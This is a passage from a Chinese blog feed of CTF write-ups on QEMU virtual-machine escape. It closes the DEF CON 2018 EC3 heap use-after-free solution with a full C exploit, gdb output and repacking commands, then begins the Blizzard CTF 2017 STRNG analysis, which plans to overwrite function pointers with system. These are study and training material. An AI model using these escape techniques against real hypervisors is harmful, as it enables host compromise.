class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      v11 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 &amp; <span class="number">0xF0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v11 == <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">          qword_1317940[i] = <span class="built_in">malloc</span>(<span class="number">8L</span>L * *(_QWORD *)&amp;n[<span class="number">4</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_1317940[v11] = <span class="built_in">malloc</span>(<span class="number">8L</span>L * *(_QWORD *)&amp;n[<span class="number">4</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20</code>作为<code>cmd</code>，<code>((unsigned int)v6 &amp; 0xF0000) &gt;&gt; 16</code>作为<code>idx</code>当：</p><p><code>cmd = 1</code>: free掉<code>qword_1317940[idx]</code>，但是并没有清零</p><p><code>cmd = 2</code>: 将val写入到<code>qword_1317940[idx] + offset</code>中 </p><p><code>cmd = 0</code>: malloc一个size为val的堆块</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>很明显的一个堆题的菜单，并且存在uaf漏洞。我们还可以发现<code>sub_6E65F9</code>为后门可以<code>cat ./flag</code>，攻击思路如下：、</p><ol><li>申请堆块</li><li>释放一个堆块</li><li>将释放的堆块edit为free_got=0x11301A0</li><li>两次malloc</li><li>将backboor写进第二次malloc空间，即可将free函数地址覆盖为后门函数</li><li>free堆块，出发漏洞，get flag</li></ol><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>为了方便，我们创建一个gdb脚本debug.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b *0x6E613C</span><br><span class="line">b *0x6E61F4</span><br><span class="line">run -initrd ./initramfs-busybox-x86_64.cpio.gz \</span><br><span class="line">-nographic \</span><br><span class="line">-kernel ./vmlinuz-4.4.0-119-generic \</span><br><span class="line">-append &quot;priority=low console=ttyS0&quot; \</span><br><span class="line">-device ooo\</span><br></pre></td></tr></table></figure><p>gdb调试qemu，执行<code>source debug.txt</code>，然后执行<code>./exp</code>。exp内容如下：</p><p>malloc大小为10的堆块，查看buffer内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint *0x6E61F4</span><br><span class="line">pwndbg&gt; x/20gx 0x1317940</span><br><span class="line">0x1317940:0x00007fffd01053a00x0000000000000000   #malloc</span><br><span class="line">0x1317950:0x00000000000000000x0000000000000000</span><br><span class="line">0x1317960:0x00000000000000000x0000000000000000</span><br><span class="line">0x1317970:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>free掉该堆块，查看tcache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">32 [  4]: 0x7fffd01053a0 —▸ 0x7fffd00fd1e0 —▸ 0x7fffd00fd120 —▸ 0x7fffd00fc8e0 ◂— 0x0</span><br></pre></td></tr></table></figure><p>由于存在uaf，可以edit刚才free掉的堆块内容为free函数的got</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">32 [  4]: 0x7fffd01053a0 —▸ 0x11301a0 (free@got.plt) —▸ 0x7ffff31cb950 (free) ◂— push   r15</span><br></pre></td></tr></table></figure><p>进行两次malloc，查看buffer内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint *0x6E61F4</span><br><span class="line">pwndbg&gt; x/20gx 0x1317940</span><br><span class="line">0x1317940:0x00007fffd01053a00x00000000011301a0</span><br><span class="line">0x1317950:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>edit第二个堆块的内容，即修改free函数got表的内容，改为后门地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x11301a0</span><br><span class="line">0x11301a0 &lt;free@got.plt&gt;:0x00000000006e65f9</span><br></pre></td></tr></table></figure><p>free操作，获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ # ./exp</span><br><span class="line">mmio_mem @ 0x7fa479af3000</span><br><span class="line">step1 malloc a chunk</span><br><span class="line">step2 free the chunk to tcache</span><br><span class="line">step3 edit the freed chunk</span><br><span class="line">flag&#123;you_can_escape_from_it&#125;</span><br></pre></td></tr></table></figure><p>完整exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_malloc</span><span class="params">(<span class="keyword">uint8_t</span> idx, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    size = size/<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> addr=(idx&lt;&lt;<span class="number">16</span>)|(<span class="number">0</span>&lt;&lt;<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> value=size;</span><br><span class="line">    mmio_write(addr,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_free</span><span class="params">(<span class="keyword">uint8_t</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> addr=(idx&lt;&lt;<span class="number">16</span>)|<span class="number">0x100000</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> value=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    mmio_write(addr, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_edit</span><span class="params">(<span class="keyword">uint8_t</span> idx, <span class="keyword">uint16_t</span> offset, <span class="keyword">uint32_t</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> addr=(idx&lt;&lt;<span class="number">16</span>)|(<span class="number">0x200000</span>)|(offset);</span><br><span class="line">    <span class="keyword">uint32_t</span> value =  data;</span><br><span class="line"></span><br><span class="line">    mmio_write(addr, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> backdoor_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the ooo device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"step1 malloc a chunk\n"</span>);</span><br><span class="line">    mmio_malloc(<span class="number">0</span>,<span class="number">0x10</span>);                           <span class="comment">//第一步</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"step2 free the chunk to tcache\n"</span>);</span><br><span class="line">    mmio_free(<span class="number">0</span>);                                  <span class="comment">//第二步</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"step3 edit the freed chunk\n"</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> free_got=<span class="number">0x11301A0</span>;</span><br><span class="line">    mmio_edit(<span class="number">0</span>,<span class="number">0</span>,free_got);                       <span class="comment">//第三步</span></span><br><span class="line">    mmio_edit(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_malloc(<span class="number">1</span>,<span class="number">0x10</span>);                           <span class="comment">//第四步</span></span><br><span class="line">    mmio_malloc(<span class="number">1</span>,<span class="number">0x10</span>); </span><br><span class="line">    mmio_edit(<span class="number">1</span>,<span class="number">0</span>,backdoor_addr);                  <span class="comment">//第五步</span></span><br><span class="line">    mmio_edit(<span class="number">1</span>,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_free(<span class="number">0</span>);                                  <span class="comment">//第六步</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -O0 exp.c -o exp</span><br></pre></td></tr></table></figure><p>最后一个问题，如何将exp传进去。可以看到给了文件系统cpio.gz，于是可以先解包，把exp放进去然后重新打包，具体步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir core</span><br><span class="line">cd core</span><br><span class="line">mv ../initramfs-busybox-x86_64.cpio.gz ./</span><br><span class="line">gunzip initramfs-busybox-x86_64.cpio.gz </span><br><span class="line">cpio -idm &lt; initramfs-busybox-x86_64.cpio</span><br><span class="line"></span><br><span class="line">cp ../exp ./</span><br><span class="line">find . | cpio -o --format=newc &gt; ../initramfs-busybox-x86_64.cpio</span><br><span class="line">cd ..</span><br><span class="line">gzip initramfs-busybox-x86_64.cpio</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这是一道与对相关的qemu escape，首先必须熟悉uaf漏洞，以及tcache机制。原题是在Ubuntu 16的环境中，需要利用fastbin attack。总体来说这道题难点有两个：一是符号表去掉了需要逆向恢复，第二点。。。没有第二点了，人家都给了后门，逆向出来基本就差不多了。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://uaf.io/exploitation/2018/05/13/DefconQuals-2018-EC3.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2018/05/13/DefconQuals-2018-EC3.html</a></p><p><a href="https://xz.aliyun.com/t/6778" target="_blank" rel="noopener">https://xz.aliyun.com/t/6778</a></p>]]></content>
      
      
      <categories>
          
          <category> qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> qemu </tag>
            
            <tag> escape </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Blizzard CTF 2017 Strng</title>
      <link href="/2019/11/27/Strng/"/>
      <url>/2019/11/27/Strng/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这段时间研究了一下qemu escape相关的内容，以这篇博客为开端，将系统的记录我学习qemu escape的历程。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><strong>Points:</strong> Legendary <strong>Solves:</strong> 0 <strong>Category:</strong> Exploitation <strong>Description:</strong> Blizzard CTF 2017: Sombra True Random  Number Generator (STRNG) Sombra True Random Number Generator (STRNG) is a QEMU-based challenge  developed for Blizzard CTF 2017. The challenge was to achieve a VM  escape from a QEMU-based VM and capture the flag located at /root/flag  on the host. The image used and distributed with the challenge was the Ubuntu Server  14.04 LTS Cloud Image. The host used the same image as the guest. The  guest was reset every 10 minutes and was started with the following  command: ./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb  my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22 Access to the guest was provided by redirecting incoming connections to  the host on port 5555 to the guest on port 22.</p><p>Username/password: ubuntu/passw0rd</p><p>从启动命令可以看出，这道题是对PCI设备<code>strng</code>的模拟，一般的思路都是通过mmio_read或者pmio_read泄露libc基地址，然后通过mmio_write或者pmio_write将system函数的地址覆盖掉某个函数的地址从而劫持程序流。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>将<code>qemu-system-x86_64</code>拖进IDA，查找strng相关函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">do_qemu_init_pci_strng_register_types</span><br><span class="line">pci_strng_register_types</span><br><span class="line">strng_class_init          ##可以查看device_id来确定设备</span><br><span class="line">pci_strng_realize</span><br><span class="line">strng_instance_init</span><br><span class="line">strng_mmio_read</span><br><span class="line">strng_mmio_write</span><br><span class="line">strng_pmio_read</span><br><span class="line">strng_pmio_write</span><br></pre></td></tr></table></figure><p>查看相关结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, mappedto_3815)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000008F0 mmio            MemoryRegion_0 ?</span><br><span class="line">000009F0 pmio            MemoryRegion_0 ?</span><br><span class="line">00000AF0 addr            dd ?</span><br><span class="line">00000AF4 regs            dd 64 dup(?)</span><br><span class="line">00000BF4                 db ? ; undefined</span><br><span class="line">00000BF5                 db ? ; undefined</span><br><span class="line">00000BF6                 db ? ; undefined</span><br><span class="line">00000BF7                 db ? ; undefined</span><br><span class="line">00000BF8 srand           dq ?                    ; offset</span><br><span class="line">00000C00 rand            dq ?                    ; offset</span><br><span class="line">00000C08 rand_r          dq ?                    ; offset</span><br><span class="line">00000C10 STRNGState      ends</span><br><span class="line">00000C10</span><br></pre></td></tr></table></figure><h4 id="查看strng-class-init函数"><a href="#查看strng-class-init函数" class="headerlink" title="查看strng_class_init函数"></a>查看strng_class_init函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_class_init</span><span class="params">(ObjectClass *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *k; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  k = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                          a1,</span><br><span class="line">                          <span class="string">"pci-device"</span>,</span><br><span class="line">                          <span class="string">"/home/rcvalle/qemu/hw/misc/strng.c"</span>,</span><br><span class="line">                          <span class="number">154</span>,</span><br><span class="line">                          <span class="string">"strng_class_init"</span>);</span><br><span class="line">  k-&gt;device_id = <span class="number">0x11E9</span>;   <span class="comment">//设备id</span></span><br><span class="line">  k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">  k-&gt;realize = (<span class="keyword">void</span> (*)(PCIDevice_0 *, Error_0 **))pci_strng_realize;</span><br><span class="line">  k-&gt;class_id = <span class="number">0xFF</span>;</span><br><span class="line">  k-&gt;vendor_id = <span class="number">0x1234</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在qemu虚拟机中查看设备，发现00:03.0即为<code>strng</code>。其中 <code>xx:yy.z</code>的格式为<code>总线:设备:功能</code>的格式。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p>查看mmio和pmio的地址信息，可以看到mmio的起始地址为<code>0xfebf1000</code>，pmio的起始端口为<code>c050</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">Physical Slot: 3</span><br><span class="line">Flags: fast devsel</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">I/O ports at c050 [size=8]</span><br></pre></td></tr></table></figure><p> 通过查看<code>resource</code>文件来查看其相应的内存空间， 如resource0（MMIO空间）以及resource1（PMIO空间） ，每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags） </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200  <span class="comment">#mmio，size=256</span></span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101  <span class="comment">#pmio，size=8</span></span><br></pre></td></tr></table></figure><h4 id="查看strng-mmio-read函数"><a href="#查看strng-mmio-read函数" class="headerlink" title="查看strng_mmio_read函数"></a>查看strng_mmio_read函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )      </span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>地址的大小为4个字节(size == 4)，且必须是4字节对齐(!(addr &amp; 3))。然后将该地址右移两位作为索引，并返回该索引对应的regs的值。可以看到regs的大小刚好等于mmio的大小，因此无法泄露任意地址。</p><h4 id="查看strng-mmio-write函数"><a href="#查看strng-mmio-write函数" class="headerlink" title="查看strng_mmio_write函数"></a>查看strng_mmio_write函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint32_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hwaddr i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v5; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    i = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)i == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = opaque-&gt;rand(opaque, i, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v7 )</span><br><span class="line">        opaque-&gt;srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)i == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = val;</span><br><span class="line">        v6 = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *))opaque-&gt;rand_r)(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        val = v5;</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      opaque-&gt;regs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)i] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先地址必须满足大小为4且4字节对齐，然后索引<code>i=addr&gt;&gt;2</code>,当：</p><p><code>i=0</code>:调用srand函数，参数为val</p><p><code>i=1</code>:调用rand产生随机数并赋值给regs[1]</p><p><code>i=3</code>:调用rand_r函数，参数为regs[2]，然后将返回结果赋值给regs[3]。但最后regs[3]还是会赋值为val</p><p>其它：将val写进regs[i]</p><p>这里其实可以看出一些猫腻，如果我们可以泄露libc基址的话，就可以</p><p>1、将srand地址覆盖为system函数的地址，val=“cat flag”，addr=0便可获取flag</p><p>2、将rand_r地址覆盖为system函数的地址，regs[2]处写入”cat flag“，addr=12便可获取flag</p><h4 id="查看strng-pmio-read函数"><a 